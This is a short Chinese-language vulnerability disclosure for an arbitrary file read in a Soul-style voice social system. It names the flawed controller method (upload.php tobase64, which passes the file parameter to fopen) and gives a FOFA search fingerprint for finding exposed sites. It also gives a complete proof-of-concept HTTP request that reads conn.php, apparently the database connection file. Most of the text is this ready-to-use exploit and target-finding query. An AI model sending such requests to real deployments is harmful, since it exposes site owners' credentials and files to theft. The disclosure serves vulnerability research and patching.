# 某仿soul欲音社交系统存在任意文件读取漏洞

位于 /application/api/controller/upload.php 控制器中的tobase64 方法通过传入file参数 然后通过fopen直接读取任意文件，然后输出base64编码后的文件.

## fofa

```javascript
"/public/style/admin/js/jquery.min.js"
```

## poc

```php
GET /api/upload/tobase64?file=conn.php HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
```

![image-20240902103855273](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409021038369.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/SuunBk1lnphYNgixyWegRg

